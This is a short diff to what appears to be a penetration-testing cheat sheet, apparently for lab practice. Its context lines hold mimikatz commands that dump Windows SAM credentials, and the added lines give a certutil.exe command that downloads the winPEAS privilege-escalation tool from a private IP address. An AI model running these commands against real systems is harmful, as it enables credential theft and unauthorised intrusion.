@@ -68,3 +68,8 @@ privilege::debug
 token::elevate
 lsadump::sam
 ```
+
+### wget equivalant
+```
+certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe
+```
